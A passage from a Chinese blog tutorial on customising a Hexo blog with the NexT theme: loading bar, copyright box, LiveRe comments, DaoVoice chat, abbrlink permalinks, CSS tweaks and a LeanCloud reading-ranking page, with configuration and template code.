class="number">1.5</span>                 <span class="comment"># Average Word Length</span></span><br><span class="line"><span class="attr">  wpm:</span> <span class="number">100</span>                 <span class="comment"># Words Per Minute（每分钟阅读词数）</span></span><br><span class="line"><span class="attr">  suffix:</span> <span class="string">mins.</span></span><br></pre></td></tr></table></figure><h4 id="博客顶端添加加载条"><a href="#博客顶端添加加载条" class="headerlink" title="博客顶端添加加载条"></a>博客顶端添加加载条</h4><p>效果图</p><p><img src="/posts/ccfc6699.html/%E5%8D%9A%E5%AE%A2%E9%A1%B6%E7%AB%AF%E5%8A%A0%E8%BD%BD%E6%9D%A1.gif" alt></p><p>实现方法</p><p>　　打开主题配置文件，找到<code>pace:</code>，修改为以下内容：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pace: <span class="literal">true</span></span><br><span class="line"># Themes list:</span><br><span class="line"># pace-<span class="built_in">theme</span>-big-counter | pace-<span class="built_in">theme</span>-bounce | pace-<span class="built_in">theme</span>-barber-shop | pace-<span class="built_in">theme</span>-center-atom</span><br><span class="line"># pace-<span class="built_in">theme</span>-center-<span class="built_in">circle</span> | pace-<span class="built_in">theme</span>-center-radar | pace-<span class="built_in">theme</span>-center-simple | pace-<span class="built_in">theme</span>-corner-indicator</span><br><span class="line"># pace-<span class="built_in">theme</span>-fill-left | pace-<span class="built_in">theme</span>-flash | pace-<span class="built_in">theme</span>-loading-bar | pace-<span class="built_in">theme</span>-mac-osx | pace-<span class="built_in">theme</span>-minimal</span><br><span class="line">pace_theme: pace-<span class="built_in">theme</span>-minimal</span><br></pre></td></tr></table></figure><h4 id="在文章底部添加版权信息"><a href="#在文章底部添加版权信息" class="headerlink" title="在文章底部添加版权信息"></a>在文章底部添加版权信息</h4><p>效果图</p><p><img src="/posts/ccfc6699.html/%E7%89%88%E6%9D%83%E4%BF%A1%E6%81%AF.png" alt></p><p>实现方法</p><p>　　打开<code>H：/blog/themes/next/layout/_macro</code>，添加<code>my-copyright.swig</code>，代码如下：</p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"></span><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> page.copyright %&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"my_post_copyright"</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">  </span></span><br><span class="line"><span class="xml">  <span class="comment">&lt;!-- JS库 sweetalert 可修改路径 --&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css"</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>本文标题:<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><span class="template-variable">&#123;&#123; page.title &#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>文章作者:<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><span class="template-variable">&#123;&#123; theme.author &#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span> | 【公众号：不会代码的程序猿】<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>发布时间:<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><span class="template-variable">&#123;&#123; page.date.format("YYYY年MM月DD日 HH:mm:ss") &#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>最后更新:<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><span class="template-variable">&#123;&#123; page.updated.format("YYYY年MM月DD日 HH:mm:ss") &#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>原始链接:<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"</span></span></span><span class="template-variable">&#123;&#123; url_for(page.path) &#125;&#125;</span><span class="xml"><span class="tag"><span class="string">"</span> <span class="attr">title</span>=<span class="string">"</span></span></span><span class="template-variable">&#123;&#123; page.title &#125;&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span><span class="template-variable">&#123;&#123; page.permalink &#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>许可协议:<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-creative-commons"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">rel</span>=<span class="string">"license"</span> <span class="attr">href</span>=<span class="string">"https://creativecommons.org/licenses/by-nc-nd/4.0/"</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">title</span>=<span class="string">"Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)"</span>&gt;</span>署名-非商业性使用-禁止演绎 4.0 国际<span class="tag">&lt;/<span class="name">a</span>&gt;</span> 转载请保留原文链接及作者。<span class="tag">&lt;/<span class="name">p</span>&gt;</span>  </span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span> </span></span><br><span class="line"><span class="xml">    var clipboard = new Clipboard('.fa-clipboard');</span></span><br><span class="line"><span class="xml">    clipboard.on('success', $(function()&#123;</span></span><br><span class="line"><span class="xml">      $(".fa-clipboard").click(function()&#123;</span></span><br><span class="line"><span class="xml">        swal(&#123;   </span></span><br><span class="line"><span class="xml">          title: "",   </span></span><br><span class="line"><span class="xml">          text: '复制成功',   </span></span><br><span class="line"><span class="xml">          html: false,</span></span><br><span class="line"><span class="xml">          timer: 500,   </span></span><br><span class="line"><span class="xml">          showConfirmButton: false</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">      &#125;);</span></span><br><span class="line"><span class="xml">    &#125;));  </span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span><span class="xml"></span></span><br></pre></td></tr></table></figure><p>　　然后在<code>H：/blog/themes/next/source/css/_common/components/post/</code>下添加<code>my-post-copyright.styl</code>：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.my_post_copyright</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">85%</span>;</span><br><span class="line">  <span class="attribute">max-width</span>: <span class="number">45em</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">2.8em</span> auto <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0.5em</span> <span class="number">1.0em</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#d3d3d3</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">0.93rem</span>;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">1.6em</span>;</span><br><span class="line">  <span class="attribute">word-break</span>: break-all;</span><br><span class="line">  <span class="attribute">background</span>: rgba(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">0.4</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.my_post_copyright</span> p&#123;<span class="attribute">margin</span>:<span class="number">0</span>;&#125;</span><br><span class="line"><span class="selector-class">.my_post_copyright</span> <span class="selector-tag">span</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">5.2em</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#333333</span>; <span class="comment">// title color</span></span><br><span class="line">  <span class="attribute">font-weight</span>: bold;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.my_post_copyright</span> <span class="selector-class">.raw</span> &#123;</span><br><span class="line">  <span class="attribute">margin-left</span>: <span class="number">1em</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">5em</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.my_post_copyright</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#808080</span>;</span><br><span class="line">  <span class="attribute">border-bottom</span>:<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.my_post_copyright</span> <span class="selector-tag">a</span>:hover &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#0593d3</span>; <span class="comment">// link color</span></span><br><span class="line">  <span class="attribute">text-decoration</span>: underline;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.my_post_copyright</span>:hover <span class="selector-class">.fa-clipboard</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.my_post_copyright</span> <span class="selector-class">.post-url</span>:hover &#123;</span><br><span class="line">  <span class="attribute">font-weight</span>: normal;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.my_post_copyright</span> <span class="selector-class">.copy-path</span> &#123;</span><br><span class="line">  <span class="attribute">margin-left</span>: <span class="number">1em</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">1em</span>;</span><br><span class="line">  +mobile()&#123;<span class="attribute">display</span>:none;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.my_post_copyright</span> <span class="selector-class">.copy-path</span>:hover &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#808080</span>;</span><br><span class="line">  <span class="attribute">cursor</span>: pointer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　然后打开<code>H:/blog/themes/next/layout/_macro/post.swig</code>文件，在<code>post-body</code> 之后， <code>post-footer</code> 之前添加以下代码：</p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">   </span><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> not is_index %&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">      </span><span class="template-tag">&#123;% <span class="name"><span class="name">include</span></span> 'my-copyright.swig' %&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">   </span><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="/posts/ccfc6699.html/%E7%89%88%E6%9D%83%E4%BF%A1%E6%81%AF%E4%BB%A3%E7%A0%81.png" alt></p><p>　　最后修改<code>next/source/css/_common/components/post/post.styl</code>文件，在最后一行增加代码：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">import</span> <span class="string">"my-post-copyright"</span></span><br></pre></td></tr></table></figure><h4 id="添加来必力评论系统"><a href="#添加来必力评论系统" class="headerlink" title="添加来必力评论系统"></a>添加来必力评论系统</h4><p>效果图</p><p><img src="/posts/ccfc6699.html/%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F.png" alt></p><p>实现方法</p><p>　　打开<a href="https://www.livere.com/" target="_blank" rel="noopener">来必力</a>的官网，注册，注册好之后打开设置页面，填写博客地址</p><p><img src="/posts/ccfc6699.html/%E6%9D%A5%E5%BF%85%E5%8A%9B%E8%AE%BE%E7%BD%AE.png" alt></p><p>　　然后在代码管理页面，把uid复制到主题配置文件<code>_config.yml</code>的<code>livere_uid:</code></p><p><img src="/posts/ccfc6699.html/%E6%9D%A5%E5%BF%85%E5%8A%9B%E4%BB%A3%E7%A0%81.png" alt></p><p><img src="/posts/ccfc6699.html/liveruid.png" alt></p><h4 id="修改博客底部的红色跳动爱心"><a href="#修改博客底部的红色跳动爱心" class="headerlink" title="修改博客底部的红色跳动爱心"></a>修改博客底部的红色跳动爱心</h4><p><img src="/posts/ccfc6699.html/%E5%BA%95%E9%83%A8%E8%AE%BF%E9%97%AE%E9%87%8F.png" alt></p><p>　　打开主题配置文件，找到<code>footer:</code>，修改为以下内容：</p><p><img src="/posts/ccfc6699.html/%E8%B7%B3%E5%8A%A8%E7%BA%A2%E5%BF%83.png" alt></p><h4 id="DaoVoice在线联系"><a href="#DaoVoice在线联系" class="headerlink" title="DaoVoice在线联系"></a>DaoVoice在线联系</h4><p>效果图</p><p><img src="/posts/ccfc6699.html/daovoice.png" alt></p><p>实现方法</p><p>　　先在 <a href="https://account.daocloud.io/signin" target="_blank" rel="noopener">daovoice</a> 注册账号，<a href="http://dashboard.daovoice.io/get-started?invite_code=0f81ff2f" target="_blank" rel="noopener">邀请码</a>是<code>dda712fb</code>，注册完成后会得到一个 app_id :</p><p><img src="/posts/ccfc6699.html/daovoice_ID.png" alt></p><p>　　然后打开<code>/themes/next/layout/_partials/head.swig</code>,在末尾添加如下代码：</p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"></span><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> theme.daovoice %&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">  (function(i,s,o,g,r,a,m)&#123;i["DaoVoiceObject"]=r;i[r]=i[r]||function()&#123;(i[r].q=i[r].q||[]).push(arguments)&#125;,i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)&#125;)(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/dda712fb.js","daovoice")</span></span><br><span class="line"><span class="xml">  daovoice('init', &#123;</span></span><br><span class="line"><span class="xml">      app_id: "</span><span class="template-variable">&#123;&#123;theme.daovoice_app_id&#125;&#125;</span><span class="xml">"</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"><span class="xml">  daovoice('update');</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span><span class="xml"></span></span><br></pre></td></tr></table></figure><p><img src="/posts/ccfc6699.html/daovoice%E4%BB%A3%E7%A0%81.png" alt></p><p>　　最后打开主题配置文件，在末尾添加如下代码：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Online contact</span></span><br><span class="line"><span class="attr">daovoice:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">daovoice_app_id:</span> <span class="string">这里填你的刚才获得的</span> <span class="string">app_id</span></span><br></pre></td></tr></table></figure><h4 id="设置博客摘要显示"><a href="#设置博客摘要显示" class="headerlink" title="设置博客摘要显示"></a>设置博客摘要显示</h4><p>　　打开主题配置文件，修改为以下内容：</p><p><img src="/posts/ccfc6699.html/%E6%91%98%E8%A6%81%E6%98%BE%E7%A4%BA.png" alt></p><p>　　这样就能实现在主页只展示部分文字，其他文字隐藏起来，通过点击’阅读更多’来阅读全文。在写每一篇文章的时候，也要在必要的地方添加<code>&lt;!-- more --&gt;</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">使用Github+Hexo搭建你的个人博客：搭建篇</span></span><br><span class="line"><span class="attr">copyright:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2019</span><span class="bullet">-07</span><span class="bullet">-21</span> <span class="number">15</span><span class="string">:25:12</span></span><br><span class="line"><span class="attr">categories:</span> <span class="string">Hexo</span></span><br><span class="line"><span class="attr">tags:</span> <span class="string">[GitHub,个人博客,Hexo]</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"></span><br><span class="line"><span class="string">&lt;blockquote</span> <span class="string">class="blockquote-center"&gt;海阔凭鱼跃，天高任鸟飞。</span></span><br><span class="line"><span class="string">&lt;/blockquote&gt;</span></span><br><span class="line"></span><br><span class="line">　　<span class="string">早在初中，就想着自己搭起一个属于自己的网站，但是没有技术又不肯学习的我，怯于尝试，一直停滞不前。大学期间终于学习了，又因为自己的懒惰，觉得很难，不肯去尝试。直至今日，我想试一试，捣鼓了好一阵子，发现认真去做了，也没有想象中的难。</span></span><br><span class="line"></span><br><span class="line"><span class="string">&lt;!--</span> <span class="string">more</span> <span class="bullet">--&gt;</span></span><br></pre></td></tr></table></figure><h4 id="文章链接唯一化"><a href="#文章链接唯一化" class="headerlink" title="文章链接唯一化"></a>文章链接唯一化</h4><p>　　也许你会数次更改文章题目或者变更文章发布时间，在默认设置下，文章链接都会改变，不利于搜索引擎收录，也不利于分享。唯一永久链接才是更好的选择。</p><p>　　首先安装插件</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm <span class="keyword">install</span> hexo-abbrlink <span class="comment">--save</span></span><br></pre></td></tr></table></figure><p>　　然后在站点配置文件中找到<code>permalink</code>，修改为如下内容：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">permalink:</span> posts/<span class="symbol">:abbrlink/</span>  <span class="comment"># “posts/” 可自行更换</span></span><br></pre></td></tr></table></figure><p>　　这里有个知识点：</p><blockquote><p>百度蜘蛛抓取网页的规则: 对于蜘蛛说网页权重越高、信用度越高抓取越频繁，例如网站的首页和内页。蜘蛛先抓取网站的首页，因为首页权重更高，并且大部分的链接都是指向首页。然后通过首页抓取网站的内页，并不是所有内页蜘蛛都会去抓取。</p></blockquote><p>　　搜索引擎认为对于一般的中小型站点，3层足够承受所有的内容了，所以蜘蛛经常抓取的内容是前三层，而超过三层的内容蜘蛛认为那些内容并不重要，所以不经常爬取。出于这个原因所以permalink后面跟着的最好不要超过2个斜杠。</p><p>　　接着在站点配置文件中添加如下代码:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># abbrlink config</span><br><span class="line"><span class="symbol">abbrlink:</span>  alg: <span class="keyword">crc32</span>  # 算法：crc16(<span class="meta">default</span>) <span class="keyword">and</span> <span class="keyword">crc32</span></span><br><span class="line"><span class="symbol">rep:</span> hex    # 进制：<span class="keyword">dec</span>(<span class="meta">default</span>) <span class="keyword">and</span> hex</span><br></pre></td></tr></table></figure><p>可选择模式：</p><ul><li><p>crc16 &amp; hex</p></li><li><p>crc16 &amp; dec</p></li><li><p>crc32 &amp; hex</p></li><li><p>crc32 &amp; dec</p></li></ul><h4 id="修改顶端的线条颜色"><a href="#修改顶端的线条颜色" class="headerlink" title="修改顶端的线条颜色"></a>修改顶端的线条颜色</h4><p>　　next主题顶端的线条颜色默认是黑色的，我看着不舒服就把它改成了粉色</p><p>效果图</p><p><img src="/posts/ccfc6699.html/%E5%8D%9A%E5%AE%A2%E9%A1%B6%E7%AB%AF%E5%8A%A0%E8%BD%BD%E6%9D%A1.gif" alt></p><p>实现方法</p><p>　　打开<code>themes/next/source/css/_variables/base.styl</code>,找到<code>headband</code>，修改为以下内容：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Headband</span></span><br><span class="line"><span class="comment">// --------------------------------------------------</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$headband</span>-height                = 2px</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$headband</span>-bg                    = #e3cae4</span></span><br></pre></td></tr></table></figure><h4 id="去除文章下方分类于的下划线"><a href="#去除文章下方分类于的下划线" class="headerlink" title="去除文章下方分类于的下划线"></a>去除文章下方分类于的下划线</h4><p>　　打开<code>themes/next/source/css/_common/scaffolding/base.styl</code>,找到<code>span.exturl</code>，修改为以下内容：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">a</span>, <span class="selector-tag">span</span><span class="selector-class">.exturl</span> &#123;</span><br><span class="line">  <span class="attribute">word-wrap</span>();</span><br><span class="line">  <span class="comment">// Remove the gray background color from active links in IE 10.</span></span><br><span class="line">  <span class="attribute">background-color</span>: transparent;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#999999</span>;</span><br><span class="line">  <span class="attribute">text-decoration</span>: none;</span><br><span class="line">  <span class="attribute">outline</span>: none;</span><br><span class="line">  <span class="attribute">border-bottom</span>: <span class="number">0px</span> solid <span class="variable">$link</span>-decoration-color;</span><br></pre></td></tr></table></figure><p><img src="/posts/ccfc6699.html/%E5%8E%BB%E9%99%A4%E5%88%86%E7%B1%BB%E4%BA%8E%E7%9A%84%E4%B8%8B%E5%88%92%E7%BA%BF.png" alt></p><h4 id="左侧社交图标居中"><a href="#左侧社交图标居中" class="headerlink" title="左侧社交图标居中"></a>左侧社交图标居中</h4><p>　　强迫症的我居然发现了左侧社交图标似乎不太居中啊，一定得把它搞居中。</p><p>效果图</p><p><img src="/posts/ccfc6699.html/%E7%A4%BE%E4%BA%A4%E5%9B%BE%E6%A0%87%E5%B1%85%E4%B8%AD%E6%95%88%E6%9E%9C%E5%9B%BE.png" alt></p><p>实现方法</p><p>　　打开<code>themes/next/source/css/_schemes/Pisces/_sidebar.styl</code>,找到<code>.site-overview</code>，修改为以下内容：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.site-overview</span> &#123;</span><br><span class="line">  <span class="comment">//margin: 0 2px;</span></span><br><span class="line">  <span class="attribute">text-align</span>:</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/ccfc6699.html/%E7%A4%BE%E4%BA%A4%E5%9B%BE%E6%A0%87%E5%B1%85%E4%B8%AD.png" alt></p><h4 id="建立阅读排行榜"><a href="#建立阅读排行榜" class="headerlink" title="建立阅读排行榜"></a>建立阅读排行榜</h4><p>　　新建一个阅读排行榜界面，，用于显示本站文章的阅读排行榜，基于lencloud进行统计</p><h5 id="新建页面"><a href="#新建页面" class="headerlink" title="新建页面"></a>新建页面</h5><p>　　<code>hexo n page top</code> 新建页面，生成 top 目录，编辑其中自动生成的 index.md 文件，将其中的代码替换如下：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">"top"</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;script src=<span class="string">"https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;AV.initialize(<span class="string">"leancloud_appid这里填入你的id"</span>, <span class="string">"leancloud_appkey这里填入你的key"</span>);&lt;/script&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">  <span class="built_in">var</span> <span class="built_in">time</span>=<span class="number">0</span></span><br><span class="line">  <span class="built_in">var</span> <span class="built_in">title</span>=<span class="string">""</span></span><br><span class="line">  <span class="built_in">var</span> url=<span class="string">""</span></span><br><span class="line">  <span class="built_in">var</span> query = <span class="built_in">new</span> AV.Query('Counter');</span><br><span class="line">  query.notEqualTo('id',<span class="number">0</span>);</span><br><span class="line">  query.descending('<span class="built_in">time</span>');</span><br><span class="line">  query.<span class="built_in">limit</span>(<span class="number">1000</span>);</span><br><span class="line">  query.find().<span class="keyword">then</span>(function (todo) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">var</span> i=<span class="number">0</span>;i&lt;<span class="number">1000</span>;i++)&#123;</span><br><span class="line">      <span class="built_in">var</span> result=todo[i].attributes;</span><br><span class="line">      <span class="built_in">time</span>=result.<span class="built_in">time</span>;</span><br><span class="line">      <span class="built_in">title</span>=result.<span class="built_in">title</span>;</span><br><span class="line">      url=result.url;</span><br><span class="line">      // <span class="built_in">var</span> <span class="built_in">content</span>=<span class="string">"&lt;a href='"</span>+<span 